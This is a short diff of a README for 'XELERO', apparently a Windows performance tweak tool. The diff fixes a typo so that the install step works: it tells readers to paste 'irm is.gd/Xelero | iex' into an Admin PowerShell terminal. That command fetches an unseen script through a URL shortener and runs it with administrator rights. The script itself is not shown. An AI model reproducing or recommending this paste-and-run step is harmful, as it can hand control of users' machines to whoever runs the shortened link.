@@ -11,7 +11,7 @@ Built for the community, XELERO focuses on kernel-level responsiveness, input la
 Paste this into an Admin PowerShell terminal:
 
 PowerShell
-irm is.gd/Xelero | iexx 
+irm is.gd/Xelero | iex 
 🛠 Features
 Kernel Injection: Optimized Win32Priority and BCDEDIT timers.
 
